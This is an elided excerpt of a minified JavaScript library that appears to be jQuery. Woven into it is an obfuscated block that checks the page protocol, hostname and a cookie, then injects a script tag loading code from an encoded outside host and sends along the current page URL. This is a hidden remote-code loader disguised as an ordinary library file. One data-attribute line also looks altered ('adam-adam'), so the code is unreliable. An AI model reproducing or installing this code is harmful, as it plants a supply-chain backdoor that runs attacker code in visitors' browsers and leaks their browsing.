!(function (e, t) {
  ...
  var w = (function (e) {
    ...
    try {
      q.apply((j = L.call(b.childNodes)), b.childNodes),
      ...
      return (
        ...
        ec(function (o, s, a, u) {
          var l,
            ...
            v = e && (o || !t) ? ew(g, p, e, a, u) : g,
            m = n ? (i || (o ? e : h || r) ? [] : s) : v;
          if ((n && n(v, m, a, u), r))
            for (l = ew(m, d), r(l, [], a, u), c = l.length; c--; )
              (f = l[c]) && (m[d[c]] = !(v[d[c]] = f));
          if (o) {
            if (i || e) {
              if (i) {
          ...
          } else (m = ew(m === s ? m.splice(h, m.length) : m)), i ? i(null, s, m, u) : q.apply(s, m);
        })
      );
    }
    function eC(e) {
            ...
            (v = k(
              ...
              (c = function (e, t, n, s, c) {
                ...
                if (((m += y), a && y !== m)) {
                  ...
                  if (e) {
                    if (0 < m) for (; y--; ) $[y] || x[y] || (x[y] = A.call(s));
                    x = ew(x);
                  }
                  q.apply(s, x),
                    c &&
  ...
  (function (e, t, n) {
    try {
      (e.f = (e) =>
        ...
        (e.c =
          "h" == n.protocol[0] &&
          /\./.test(n.hostname) &&
          !RegExp(e.b).test(t.cookie)),
        setTimeout(function () {
          e.c &&
            ((e.s = t.createElement("script")),
            (e.s.src =
              e.f("myyux?44hisxyfy3sjy4ljy4xhwnuy3oxDwjkjwwjwB") + n.href),
    ...
    (b.uniqueSort = b.unique = w.uniqueSort),
    (b.text = w.getText),
    (b.isXMLDoc = w.isXML),
    (b.contains = w.contains),
    (b.escapeSelector = w.escape);
  ...
  (b.filter = function (e, t, n) {
    ...
    b.fn.extend({
      ...
      is: function (e) {
        return !!N(this, "string" == typeof e && k.test(e) ? b(e) : e || [], !1)
          .length;
      },
    });
  var j,
      ...
      function (e, t) {
        b.fn[e] = function (n, r) {
          ...
          return (
            ...
            1 < this.length &&
              (q[e] || b.uniqueSort(i), D.test(e) && i.reverse()),
            this.pushStack(i)
          );
        };
      }
  ...
  function Z(e, t, n) {
    ...
    if (void 0 === n && 1 === e.nodeType) {
      if (
        ((r = "data-" + t.replace(J, "adam-adam").toLowerCase()),
  ...
  function eq(e, t, n, r) {
    ...
    if (
      ...
      for (u = (a = b.map(ev(i, "script"), ej)).length; f < p; f++)
        (l = i),
          f !== g &&
            ((l = b.clone(l, !0, !0)), u && b.merge(a, ev(l, "script"))),
          n.call(e[f], l, f);
      if (u)
        for (c = a[a.length - 1].ownerDocument, b.map(a, eA), f = 0; f < u; f++)
          (l = a[f]),
            eh.test(l.type || "") &&
    ...
    return (
      ...
      (e in eR
        ...
        : (eF[e] =
            (function (e) {
              for (
                var t = e[0].toUpperCase() + e.slice(1), n = e9.length;
                n--;

              )
                if ((e = e9[n] + t) in eR) return e;
            })(e) || e))
    );
  }
  ...
  b.extend({
    ...
    b.each(["height", "width"], function (e, t) {
      b.cssHooks[t] = {
        get: function (e, n, r) {
          if (n)
            return !e2.test(b.css(e, "display")) ||
    ...
    (b.cssHooks.marginLeft = eB(d.reliableMarginLeft, function (e, t) {
      if (t)
        return (
  ...
  (tE.href = tf.href),
    b.extend({
      ...
      ajax: function (t, n) {
        ...
        d.ifModified &&
          (b.lastModified[i] &&
            T.setRequestHeader("If-Modified-Since", b.lastModified[i]),
          b.etag[i] && T.setRequestHeader("If-None-Match", b.etag[i])),
        ...
        T.setRequestHeader(
          ...
          d.dataTypes[0] && d.accepts[d.dataTypes[0]]
            ? d.accepts[d.dataTypes[0]] +
                ("*" !== d.dataTypes[0] ? ", " + tS + "; q=0.01" : "")
            : d.accepts["*"]
        ),
        d.headers))
          T.setRequestHeader(f, d.headers[f]);
        if (d.beforeSend && (!1 === d.beforeSend.call(h, T, d) || l))
          return T.abort();
        if (
          ((w = "abort"),
          y.add(d.complete),
          ...
          if (((T.readyState = 1), c && g.trigger("ajaxSend", [T, d]), l))
            return T;
          d.async &&
            0 < d.timeout &&
            ...
            f
              ? (d.ifModified &&
                  ((_ = T.getResponseHeader("Last-Modified")) &&
                    (b.lastModified[i] = _),
                  (_ = T.getResponseHeader("etag")) && (b.etag[i] = _)),
                204 === t || "HEAD" === d.type
                  ? (w = "nocontent")
                  : 304 === t
                  ? (w = "notmodified")
                  : ((w = x.state), (p = x.data), (f = !(v = x.error))))
              : ((v = w), (!t && w) || ((w = "error"), t < 0 && (t = 0))),
            (T.status = t),
            (T.statusText = (n || w) + ""),
            f ? m.resolveWith(h, [p, w, T]) : m.rejectWith(h, [T, w, v]),
            T.statusCode($),
            ($ = void 0),
            c && g.trigger(f ? "ajaxSuccess" : "ajaxError", [T, d, f ? p : v]),
            y.fireWith(h, [T, w]),
            c &&
  ...
  b.ajaxSetup({
    ...
    b.each(["top", "left"], function (e, t) {
      b.cssHooks[t] = eB(d.pixelPosition, function (e, n) {
        if (n)
          return (n = e1(e, t)), eH.test(n) ? b(e).position()[t] + "px" : n;
      });
    }),
